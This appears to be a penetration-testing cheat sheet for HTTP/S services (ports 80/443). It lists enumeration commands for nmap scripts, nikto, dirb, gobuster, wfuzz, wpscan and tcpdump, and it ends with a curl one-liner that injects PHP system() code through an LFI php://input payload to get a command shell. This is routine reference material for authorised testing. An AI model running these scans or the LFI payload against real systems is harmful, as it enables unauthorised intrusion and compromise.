---
description: 'TCP/80, TCP/443'
---

# HTTP/S

### nmap scans

```bash
nmap --script=http-enum -p80 -n $ip

nmap -sV -Pn -vv -p 80 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt -oN $ip

nmap --script http-methods --script-args http-methods.url-path='/test' $ip

nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip
```

### uniscan

```bash
 perl ./uniscan.pl -u http://www.example.com/ -qweds
```

### nikto

```bash
nikto -h $ip
nikto -C all -h http://$ip
```

### Directory scans

```bash
./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $ip -e php

dirb http://$ip /usr/share/dirb/wordlists/common.txt

folders = ["/usr/share/dirb/wordlists", "/usr/share/dirb/wordlists/vulns"]
#for each folder and file
dirb [url] [folder/file] [report] -S -r

gobuster -u http://$ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

### wfuzz

```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ

#Recurse level 3
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
```

### Wordpress

```bash
wpscan --url $ip/blog
```

### Inspection

```bash
tcpdump tcp port 80 -w output.pcap -i eth0
```

### PHP LFI command shell

```bash
curl -s --data "<?system (<'cmd'>);?>" LFI=php://input%00
```



